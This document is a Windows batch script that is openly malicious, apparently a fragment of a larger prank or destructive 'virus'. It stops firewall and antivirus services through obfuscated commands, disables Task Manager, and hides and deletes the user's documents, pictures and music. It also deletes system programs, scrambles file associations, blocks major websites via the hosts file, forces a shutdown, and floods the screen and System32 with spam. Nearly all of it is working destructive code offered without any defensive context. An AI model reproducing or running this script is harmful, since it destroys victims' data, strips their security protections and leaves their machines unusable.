%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus RPC Server" /y
cls
%ii%%ury% %ywe%%iej% netsvcs
%ii%%ury% %ywe%%iej% spoolnt
::---------------------------::
::----Disable Taskmanager----::
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
::---------------------------::
REN *.jpeg *.vir
REN *.gif *.vir
REN *.png *.vir
::----Hide My Documents Folder---::
attrib +h "%userprofile%\my documents"
::---------------------------::
::----Hide My Pictures Folder---::
attrib +h "%userprofile%\my documents\my pictures"
::---------------------------::
::----Hide My Music Folder---::
attrib +h "%userprofile%\my documents\my music"
::---------------------------::
::----Hide My Music Folder---::
attrib +h "%userprofile%\my documents\my videos"
::---------------------------::
::--Confuse File Extensions--::
assoc .dll=txtfile
assoc .exe=pngfile
assoc .bat=WinRAR
assoc .vbs=Visual Style
assoc .reg=xmlfile
assoc .txt=regfile
::---------------------------::
::---Disable Taskmanager-----::
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
::---------------------------::
::-------Delete MS Paint-----::
del /f /q "mspaint.exe"
::---------------------------::
::-----Delete My Music-------::
del /f /q "C:\Users\%userprofile%\My Documents\My Music\*.*"
::---------------------------::
::--Delete Internet Explorer-::
del /f /q "C:\Program Files\Internet Explorer\iexplore.exe"
::---------------------------::
::-------Delete Notepad------::
del /f /q "notepad.exe"
::---------------------------::
::--Delete Windows Live Mail-::
del /f /q "wlmail.exe"
::---------------------------::
::--------Delete Calc.-------::
del /f /q "calc.exe"
::---------------------------::
::-------Delete Wordpad------::
del /f /q "WordPad.exe"
::---------------------------::
::-----Delete My Pictures----::
del /f /q "C:\Users\%userprofile%\My Documents\My Pictures\*.*"
::---------------------------::
::----Delete My Documents----::
del /f /q "C:\Users\%userprofile%\My Documents\*.*"
::---------------------------::
::-------Block YouTube-------::
cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 youtube.com >> "Hosts"
echo 127.0.0.1 www.youtube.com >> "Hosts"
::---------------------------::
::--------Block Google-------::
cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 google.com >> "Hosts"
echo 127.0.0.1 www.google.com >> "Hosts"
::---------------------------::
::--------Block Hotmail------::
cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 hotmail.com >> "Hosts"
echo 127.0.0.1 www.hotmail.com >> "Hosts"
::---------------------------::
::---------Block MSN---------::
cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 msn.com >> "Hosts"
echo 127.0.0.1 www.msn.com >> "Hosts"
::---------------------------::
::-------Block Wikipedia-----::
cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 wikipedia.org >> "Hosts"
echo 127.0.0.1 www.wikipedia.org >> "Hosts"
::---------------------------::
::--------Block Yahoo!-------::
cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 yahoo.com >> "Hosts"
echo 127.0.0.1 www.yahoo.com >> "Hosts"
::---------------------------::
::-----Shutdown Computer-----::
shutdown -s -t 5 -c "ahahhahahaha"
::---------------------------::
::--------MsgBox Spam--------::
echo Do>>msgbox.vbs
echo x=msgbox("You Have Been Hacked.",vbExclamation or vbOkOnly,"Hacked") >>msgbox.vbs
echo Loop>>msgbox.vbs
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
start "" "msgbox.vbs"
::---------------------------::
::-------Spam C Drive--------::
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
::---------------------------::
::----Spam System32 Folder---::
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
echo %random% > "C:\Windows\System32\%random%Spammed Filetype"
::---------------------------::
